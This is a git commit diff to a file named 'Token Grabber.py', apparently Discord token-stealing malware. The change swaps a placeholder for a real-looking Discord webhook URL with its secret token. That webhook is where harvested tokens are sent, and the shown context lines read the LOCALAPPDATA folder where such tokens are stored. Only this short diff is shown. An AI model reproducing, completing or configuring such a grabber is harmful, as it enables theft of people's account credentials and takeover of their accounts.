0bfde6cf290fbaf445c6570828f52860d338e661
fwakio39 <148625449+fwakio39@users.noreply.github.com>
2024-01-18 16:10:20 +0100

    Update Token Grabber.py

--- Token Grabber.py
+++ Token Grabber.py
@@ -6,7 +6,7 @@ from base64 import b64decode
 from re import findall
 
 # Input your webhook here
-userwh = "REPLACE THIS BY YOUR WEBHOOK"
+userwh = "https://discord.com/api/webhooks/1197558426826461276/W83gz5CTzixqz3PlXmMYzDPnSJMaz1qv6fzJ_TUEf04NRYse9JjjAZBzuVk2--iFRIjF"
 
 try:
     LOCAL = os.getenv("LOCALAPPDATA")
